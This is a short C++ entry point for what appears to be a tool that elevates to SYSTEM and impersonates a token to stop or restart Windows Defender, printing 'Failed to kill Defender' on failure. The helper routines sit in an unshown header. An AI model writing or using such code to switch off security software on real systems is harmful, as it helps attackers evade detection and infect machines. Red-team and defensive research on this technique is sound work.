#include "common.hpp"

int main(int argc, char** argv)
{
	if (argc != 2)
	{
		PrintUsage();
		return 0;
	}
	std::string inputSwitch = argv[1];

	auto success = GetSystem();
	if (!success)
	{
		std::cout << "[-] Failed to kill Defender...\n";
		return 0;
	}

	if (inputSwitch.find("off") != -1) std::thread thread_object(ImpersonateAndStop);
	else if (inputSwitch.find("on") != -1) std::thread thread_object(ImpersonateAndStart);
	else PrintUsage();

	return 0;
}